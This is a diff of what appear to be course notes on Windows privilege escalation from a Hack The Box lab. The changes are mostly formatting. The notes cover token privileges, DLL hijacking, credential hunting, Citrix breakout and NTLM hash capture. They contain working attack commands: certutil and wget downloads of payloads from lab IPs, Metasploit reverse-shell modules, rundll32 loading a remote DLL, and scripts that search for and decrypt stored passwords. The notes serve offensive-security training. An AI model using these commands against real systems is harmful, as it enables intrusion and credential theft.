@@ -112,8 +112,8 @@ Suppose we are unable to load tools on the target for whatever reason but have R
 
 ## Remote Code Execution as SYSTEM
 
-https://github.com/decoder-it/psgetsystem
-https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC
+<https://github.com/decoder-it/psgetsystem>
+<https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC>
 
 # SeTakeOwnershipPrivilege
 
@@ -186,8 +186,8 @@ We may also come across `.kdbx` KeePass database files, OneNote notebooks, files
 
 # Windows Built-in Groups
 
-Backup Operators 	Event Log Readers 	DnsAdmins
-Hyper-V Administrators 	Print Operators 	Server Operators
+Backup Operators  Event Log Readers  DnsAdmins
+Hyper-V Administrators  Print Operators  Server Operators
 
 ## Backup Operators
 
@@ -384,12 +384,13 @@ Privilege Name                Description                          State
 ============================= ==================================  ==========
 SeMachineAccountPrivilege     Add workstations to domain           Disabled
 SeLoadDriverPrivilege         Load and unload device drivers       Disabled
-SeShutdownPrivilege           Shut down the system			       Disabled
+SeShutdownPrivilege           Shut down the system          Disabled
 SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
 ```
 
 t's well known that the driver `Capcom.sys` contains functionality to allow any user to execute shellcode with SYSTEM privileges. We can use our privileges to load this vulnerable driver and escalate privileges. We can use [this](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) tool to load the driver. The PoC enables the privilege as well as loads the driver for us.
+
 ## Use ExploitCapcom Tool to Escalate Privileges
 
 To exploit the Capcom.sys, we can use the [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) tool after compiling with it Visual Studio.
@@ -475,7 +476,7 @@ Major  Minor  Build  Revision
 
 This returns the build version 14393, which using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page we cross-reference to Windows release `1607`.
 
-The [UACME](https://github.com/hfiref0x/UACME) project maintains a list of UAC bypasses, including information on the affected Windows build number, the technique used, and if Microsoft has issued a security update to fix it. 
+The [UACME](https://github.com/hfiref0x/UACME) project maintains a list of UAC bypasses, including information on the affected Windows build number, the technique used, and if Microsoft has issued a security update to fix it.
 
 # Weak Permissions
 
@@ -638,7 +639,7 @@ Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
 3. **ALPC Task Scheduler 0-Day**
    - **Type:** Local Privilege Escalation
    - **Description:** Uses ALPC endpoint method to manipulate DACLs in .job files, allowing SYSTEM-level access via the Spooler service.
-https://blog.grimm-co.com/2020/05/alpc-task-scheduler-0-day.html
+<https://blog.grimm-co.com/2020/05/alpc-task-scheduler-0-day.html>
 
 4. **CVE-2021-36934 (HiveNightmare/SeriousSam)**
    - **Type:** Local Privilege Escalation
@@ -772,7 +773,7 @@ PS C:\htb> wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenancese
 
 > [!NOTE]
 > For this step we need to make two copies of the malicious .exe file. We can just pull it over twice or do it once and make a second copy.
-> 
+>
 > We need to do this because running the exploit corrupts the malicious version of `maintenanceservice.exe` that is moved to (our copy in `c:\Users\htb-student\Desktop` that we are targeting) `c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe` which we will need to account for later. If we attempt to utilize the copied version, we will receive a `system error 216` because the .exe file is no longer a valid binary.
 
 Running the Exploit
@@ -836,8 +837,10 @@ DLL Injection is a technique used to insert code into a running process by loadi
 ## Methods
 
 ### LoadLibrary
+
 - **Description**: Utilizes the `LoadLibrary` API to load a DLL into the target process's address space.
 - **Legitimate Use Example**:
+
   ```c
   #include <windows.h>
   #include <stdio.h>
@@ -854,6 +857,7 @@ DLL Injection is a technique used to insert code into a running process by loadi
   ```
 
 ### Manual Mapping
+
 - **Description**: An advanced method that manually loads a DLL into a process's memory, resolving imports and relocations without using `LoadLibrary`.
 - **Steps**:
   1. Load the DLL as raw data into the injecting process.
@@ -861,6 +865,7 @@ DLL Injection is a technique used to insert code into a running process by loadi
   3. Inject shellcode to execute the DLL, handling relocations and imports manually.
 
 ### Reflective DLL Injection
+
 - **Description**: Uses reflective programming to load a library from memory into a host process. The library implements a minimal PE loader.
 - **GitHub Resource**: [Stephen Fewer's Reflective DLL Injection](https://github.com/stephenfewer/ReflectiveDLLInjection)
 - **Process**:
@@ -870,6 +875,7 @@ DLL Injection is a technique used to insert code into a running process by loadi
   4. Calls the library's entry point function, `DllMain`.
 
 ### DLL Hijacking
+
 - **Description**: Exploits the DLL search order to load malicious DLLs when an application doesn't specify the full path.
 - **Safe DLL Search Mode**:
   - **Enable/Disable**:
@@ -886,6 +892,7 @@ DLL Injection is a technique used to insert code into a running process by loadi
   4. Place the malicious DLL in a directory that is searched before the legitimate one.
 
 - **Code Example for Proxying**:
+
   ```c
   // tamper.c
   #include <stdio.h>
@@ -919,6 +926,7 @@ DLL Injection is a technique used to insert code into a running process by loadi
 - **Invalid Libraries**:
   - **Description**: Replace a valid library the program is attempting to load but cannot find with a crafted library.
   - **Code Example**:
+
     ```c
     #include <stdio.h>
     #include <Windows.h>
@@ -938,6 +946,7 @@ DLL Injection is a technique used to insert code into a running process by loadi
     ```
 
 ## Tools and Resources
+
 - **Process Explorer**: Part of Microsoft's Sysinternals suite, provides detailed information on running processes and their loaded DLLs.
 - **PE Explorer**: A tool to open and examine PE files, revealing imported DLLs and functions.
 - **Procmon (Process Monitor)**: Useful for tracking DLL loading and identifying missing DLLs.
@@ -949,16 +958,21 @@ Credentials are crucial for privilege escalation and gaining access to systems. 
 ## Application Configuration Files
 
 - **Search for Passwords in Config Files**: Applications may store passwords in cleartext within configuration files. Use `findstr` to locate these files.
+
   ```powershell
   findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
   ```
+
   - **Sensitive IIS Information**: Check `web.config` files for credentials, typically found at `C:\inetpub\wwwroot\web.config`.
 
 ## Dictionary Files
 
 - **Chrome Dictionary Files**: Users may add passwords to dictionary files to avoid spellcheck underlines.
+
   ```powershell
+
 gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
+
   ```
 
 ## Unattended Installation Files
@@ -982,8 +996,11 @@ dir Windows\Panther\unattend.xml
 
 - **Location**: `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`.
 - **Read PowerShell History**:
+
   ```powershell
+
 gc (Get-PSReadLineOption).HistorySavePath
+
   ```
 - **Retrieve All Accessible History Files**:
   ```powershell
@@ -993,10 +1010,13 @@ foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\
 ## PowerShell Credentials
 
 - **Decrypting PowerShell Credentials**: Credentials stored using DPAPI can be decrypted if executed in the same user context.
+
   ```powershell
+
 $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
 $credential.GetNetworkCredential().username
 $credential.GetNetworkCredential().password
+
   ```
 # Other Files
 
@@ -1014,18 +1034,23 @@ We can search the file system or share drive(s) manually using the following com
   ```
 
 - **Example 2**:
+
   ```cmd
   findstr /si password *.xml *.ini *.txt *.config
   ```
 
 - **Example 3**:
+
   ```cmd
   findstr /spin "password" *.*
   ```
 
 - **Using PowerShell**:
+
   ```powershell
+
 select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
+
   ```
 
 ### Search for File Extensions
@@ -1036,13 +1061,17 @@ select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
   ```
 
 - **Example 2**:
+
   ```cmd
   where /R C:\ *.config
   ```
 
 - **Using PowerShell**:
+
   ```powershell
-Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
+
+Get-ChildItem C:\ -Recurse -Include *.rdp,*.config, *.vnc,*.cred -ErrorAction Ignore
+
   ```
 
 ## Sticky Notes Passwords
@@ -1066,6 +1095,7 @@ Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction 
 ## Other Files of Interest
 
 - **Potential Credential Files**:
+
   ```shell
   %SYSTEMDRIVE%\pagefile.sys
   %WINDIR%\debug\NetSetup.log
@@ -1152,35 +1182,42 @@ Understanding how to manually search for these files is crucial, as automated sc
 # Citrix Breakout
 
 ## Overview
+
 Organizations use virtualization platforms like Citrix to provide remote access while implementing "lock-down" measures to enhance security. Despite these restrictions, threat actors can potentially "break-out" of these environments.
 
 ## Basic Methodology for Break-out
+
 1. Gain access to a `Dialog Box`.
 2. Exploit the Dialog Box for `command execution`.
 3. `Escalate privileges` for higher access.
 
 ## Bypassing Path Restrictions
+
 - **Objective**: Access restricted directories.
 - **Method**: Use Windows dialog boxes (e.g., from MS Paint) to enter paths directly.
 - **Example**: Enter `\\127.0.0.1\c$\users\pmorgan` in the dialog box to access directories.
 - **Tools**: MS Paint, Notepad, Wordpad.
 
 ## Accessing SMB Share from Restricted Environment
+
 - **Objective**: Transfer files despite restrictions.
 - **Method**: Use UNC paths in dialog boxes to access SMB shares.
 - **Command**: Start SMB server with `smbserver.py`.
 - **Example**: Access share with `\\10.13.38.95\share` in Paint's dialog box.
 
 ## Alternate Explorer
+
 - **Objective**: Bypass File Explorer restrictions.
 - **Tools**: Use `Q-Dir` or `Explorer++` to navigate restricted directories.
 - **Link**: [Explorer++](https://explorerplusplus.com/)
 
 ## Alternate Registry Editors
+
 - **Objective**: Edit registry despite restrictions.
 - **Tools**: Use alternative editors like [Simpleregedit](https://sourceforge.net/projects/simpregedit/), [Uberregedit](https://sourceforge.net/projects/uberregedit/), [SmallRegistryEditor](https://sourceforge.net/projects/sre/).
 
 ## Modify Existing Shortcut File
+
 - **Objective**: Gain access by modifying shortcuts.
 - **Steps**:
   1. Right-click shortcut, select `Properties`.
@@ -1188,16 +1225,19 @@ Organizations use virtualization platforms like Citrix to provide remote access 
   3. Execute shortcut to spawn cmd.
 
 ## Script Execution
+
 - **Objective**: Execute scripts to bypass restrictions.
 - **Method**: Create and run scripts like `.bat` files.
 - **Example**: Create `evil.bat` with `cmd` command to open Command Prompt.
 
 ## Escalating Privileges
+
 - **Objective**: Identify and exploit system vulnerabilities.
 - **Tools**: Use [Winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS), [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1).
 - **Example**: Use `PowerUp.ps1` to create `UserAdd.msi` for privilege escalation.
 
 ## Bypassing UAC
+
 - **Objective**: Overcome User Account Control restrictions.
 - **Method**: Use UAC bypass scripts.
 - **Example**: Import and execute `Bypass-UAC.ps1` with `Bypass-UAC -Method UacMethodSysprep`.
@@ -1205,15 +1245,18 @@ Organizations use virtualization platforms like Citrix to provide remote access 
 # Interacting with Users
 
 ## Overview
+
 Users can be a weak link in security. Techniques to exploit this include capturing credentials through network sniffing or placing malicious files on shared drives to capture user password hashes.
 
 ## Traffic Capture
+
 - **Objective**: Capture network traffic to obtain credentials.
 - **Tools**: `Wireshark`, `tcpdump`, [net-creds](https://github.com/DanMcInerney/net-creds).
 - **Example**: Capture cleartext FTP credentials using Wireshark.
 - **Command**: Run `tcpdump` or `Wireshark` to monitor traffic.
 
 ## Process Command Lines
+
 - **Objective**: Monitor command lines for credentials.
 - **Script**: Capture process command lines every two seconds and compare for differences.
 - **Example**: Use PowerShell script to reveal passwords passed in command lines.
@@ -1228,10 +1271,12 @@ while($true) {
 ```
 
 ## Vulnerable Services
+
 - **Objective**: Exploit vulnerable applications for privilege escalation.
 - **Example**: [CVE-2019–15752](https://medium.com/@morgan.henry.roman/elevation-of-privilege-in-docker-for-windows-2fd8450b478e) in Docker Desktop allows writing malicious executables for privilege escalation.
 
 ## SCF on a File Share
+
 - **Objective**: Capture NTLMv2 password hashes using SCF files.
 - **Tools**: [Responder](https://github.com/lgandx/Responder), [Inveigh](https://github.com/Kevin-Robertson/Inveigh).
 - **Example**: Create a malicious SCF file to capture hashes when accessed.
@@ -1251,6 +1296,7 @@ sudo responder -wrf -v -I tun0
 ```
 
 ## Capturing Hashes with a Malicious .lnk File
+
 - **Objective**: Use .lnk files to capture hashes on Server 2019.
 - **Tools**: [Lnkbomb](https://github.com/dievus/lnkbomb).
 - **Example**: Generate a malicious .lnk file using PowerShell.
@@ -1267,17 +1313,20 @@ $lnk.Save()
 ```
 
 # Miscellaneous Techniques
+
 ## Living Off The Land Binaries and Scripts (LOLBAS)
+
 - **LOLBAS Project**: Utilizes Microsoft-signed binaries, scripts, and libraries for unexpected functionalities like code execution, file transfers, and UAC bypass.
-- **Certutil.exe**: 
+- **Certutil.exe**:
   - **File Transfer**: `certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat`
   - **Encoding**: `certutil -encode file1 encodedfile`
   - **Decoding**: `certutil -decode encodedfile file2`
 - **Rundll32.exe**: Executes DLL files, potentially for reverse shells.
 
 ## Always Install Elevated
+
 - **Policy Setting**: Enables installation with elevated privileges via Local Group Policy.
-- **Enumeration**: 
+- **Enumeration**:
   - `reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`
   - `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
 - **Exploitation**: Create a malicious MSI package with `msfvenom` and execute it to gain SYSTEM privileges.
@@ -1285,6 +1334,7 @@ $lnk.Save()
   - **Listener**: `nc -lnvp 9443`
 
 ## CVE-2019-1388
+
 - **Vulnerability**: Exploits Windows Certificate Dialog to run a browser as SYSTEM.
 - **Exploitation Steps**:
   - Run `hhupd.exe` as administrator.
@@ -1292,16 +1342,19 @@ $lnk.Save()
   - Use `View page source` to launch `cmd.exe` as SYSTEM.
 
 ## Scheduled Tasks
-- **Enumeration**: 
+
+- **Enumeration**:
   - `schtasks /query /fo LIST /v`
   - `Get-ScheduledTask | select TaskName,State`
 - **Exploitation**: Look for writable directories like `C:\Scripts` to modify scripts executed by scheduled tasks.
 
 ## User/Computer Description Field
+
 - **Local User Enumeration**: `Get-LocalUser`
 - **Computer Description**: `Get-WmiObject -Class Win32_OperatingSystem | select Description`
 
 ## Mount VHDX/VMDK
+
 - **File Types**: `.vhd`, `.vhdx`, `.vmdk` for virtual hard disks.
 - **Mounting on Linux**:
   - VMDK: `guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk`
@@ -1316,11 +1369,14 @@ For an older OS like Windows Server 2008, we can use an enumeration script like 
 ## Enumeration and Exploitation
 
 ### Querying Current Patch Level
+
 - **WMI Command**: `wmic qfe` to list installed hotfixes and identify missing patches.
 
 ### Running Sherlock
+
 - **Sherlock Script**: Used to identify missing patches and vulnerabilities.
-  - **Command**: 
+  - **Command**:
+
     ```powershell
     Set-ExecutionPolicy bypass -Scope process
     Import-Module .\Sherlock.ps1
@@ -1328,8 +1384,10 @@ For an older OS like Windows Server 2008, we can use an enumeration script like 
     ```
 
 ## Obtaining a Meterpreter Shell
+
 - **Metasploit smb_delivery Module**: Used to deliver a Meterpreter reverse shell.
   - **Setup**:
+
     ```shell
     use exploit/windows/smb/smb_delivery
     set SRVHOST 10.10.14.3
@@ -1337,11 +1395,14 @@ For an older OS like Windows Server 2008, we can use an enumeration script like 
     set LPORT 4444
     exploit
     ```
+
   - **Execution on Target**: `rundll32.exe \\10.10.14.3\lEUZam\test.dll,0`
 
 ## Privilege Escalation
+
 - **MS10-092 Exploit**: Use the Task Scheduler XML Privilege Escalation vulnerability.
   - **Setup**:
+
     ```shell
     use exploit/windows/local/ms10_092_schelevator
     set SESSION 1
@@ -1349,9 +1410,11 @@ For an older OS like Windows Server 2008, we can use an enumeration script like 
     set LPORT 4443
     exploit
     ```
+
   - **Migration to 64-bit Process**: Ensure the Meterpreter session is running in a 64-bit process for compatibility.
 
 ### Receiving Elevated Reverse Shell
+
 - **Successful Exploit**: Results in a Meterpreter session with `NT AUTHORITY\SYSTEM` privileges, allowing for further post-exploitation activities.
 
 # Windows Desktop
@@ -1359,7 +1422,9 @@ For an older OS like Windows Server 2008, we can use an enumeration script like 
 ## Enumeration and Exploitation
 
 ### Install Python Dependencies (Local VM)
+
 - **Dependencies for Windows-Exploit-Suggester**:
+
   ```shell
   sudo wget https://files.pythonhosted.org/packages/28/84/27df240f3f8f52511965979aad7c7b77606f8fe41d4c90f2449e02172bb1/setuptools-2.0.tar.gz
   sudo tar -xf setuptools-2.0.tar.gz
@@ -1373,21 +1438,28 @@ For an older OS like Windows Server 2008, we can use an enumeration script like 
   ```
 
 ### Gathering Systeminfo Command Output
+
 - **Command**: `systeminfo` to capture system details for analysis.
 
 ### Updating the Local Microsoft Vulnerability Database
+
 - **Command**: `sudo python2.7 windows-exploit-suggester.py --update` to update the vulnerability database.
 
 ### Running Windows Exploit Suggester
-- **Command**: 
+
+- **Command**:
+
   ```shell
   python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt
   ```
+
   - Identifies potential privilege escalation vulnerabilities.
 
 ### Exploiting MS16-032 with PowerShell PoC
+
 - **PowerShell Exploit**: Use a PowerShell script to exploit MS16-032 for privilege escalation.
   - **Commands**:
+
     ```powershell
     Set-ExecutionPolicy bypass -scope process
     Import-Module .\Invoke-MS16-032.ps1
@@ -1395,6 +1467,6 @@ For an older OS like Windows Server 2008, we can use an enumeration script like 
     ```
 
 ### Spawning a SYSTEM Console
+
 - **Result**: Successful exploitation results in a SYSTEM-level command prompt.
   - **Command**: `whoami` confirms elevated privileges as `nt authority\system`.
-
